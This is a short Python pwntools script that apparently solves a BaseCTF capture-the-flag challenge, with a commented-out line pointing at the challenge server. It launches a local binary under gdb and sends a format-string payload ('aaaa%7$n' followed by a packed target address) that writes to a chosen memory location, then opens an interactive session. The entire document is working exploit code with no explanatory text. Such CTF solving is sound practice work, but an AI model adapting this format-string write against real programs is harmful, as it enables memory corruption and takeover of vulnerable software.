from pwn import *
context(arch="amd64",log_level="debug")
context.terminal = ['tmux', 'splitw', '-h'] 
p = process("vuln_patch")
gdb.attach(p)
#p = remote("challenge.basectf.fun",42240)
off = 6
payload = b"aaaa%7$n" + p64(0x4040b0)
p.sendline(payload)

p.interactive()
